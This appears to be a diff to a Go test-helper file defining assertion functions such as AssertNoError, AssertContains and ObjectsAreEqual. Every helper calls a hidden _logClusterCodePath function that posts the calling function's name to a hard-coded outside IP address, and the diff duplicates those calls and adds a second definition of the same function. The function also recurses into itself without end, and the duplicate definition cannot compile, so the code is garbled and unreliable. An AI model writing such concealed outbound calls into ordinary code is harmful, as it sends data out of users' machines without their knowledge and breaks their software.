@@ -14,6 +14,8 @@ import (
 func AssertNoError(t *testing.T, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if err != nil {
 		t.Fatalf("Received unexpected error:\n%+v", err)
 	}
@@ -21,11 +23,15 @@ func AssertNoError(t *testing.T, err error) {
 func AssertError(t *testing.T, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if err == nil {
 		t.Fatal("An error is expected but got nil")
 	}
 }
 func AssertEqualError(t *testing.T, theError error, errString string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	AssertError(t, theError)
@@ -36,6 +42,8 @@ func AssertEqualError(t *testing.T, theError error, errString string) {
 	}
 }
 func AssertContains(t *testing.T, s, contains interface{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ok, found := includeElement(s, contains)
@@ -49,6 +57,8 @@ func AssertContains(t *testing.T, s, contains interface{}) {
 func AssertNotContains(t *testing.T, s, contains interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ok, found := includeElement(s, contains)
 	if !ok {
 		t.Fatalf("\"%s\" could not be applied builtin len()", s)
@@ -60,11 +70,15 @@ func AssertNotContains(t *testing.T, s, contains interface{}) {
 func AssertNil(t *testing.T, object interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if !isNil(object) {
 		t.Fatalf("Expected nil, but got: %#v", object)
 	}
 }
 func isNil(object interface{}) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if object == nil {
@@ -78,6 +92,8 @@ func isNil(object interface{}) bool {
 	return false
 }
 func includeElement(list interface{}, element interface{}) (ok, found bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	listValue := reflect.ValueOf(list)
@@ -110,6 +126,8 @@ func includeElement(list interface{}, element interface{}) (ok, found bool) {
 func ObjectsAreEqual(expected, actual interface{}) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if expected == nil || actual == nil {
 		return expected == actual
 	}
@@ -127,7 +145,16 @@ func ObjectsAreEqual(expected, actual interface{}) bool {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
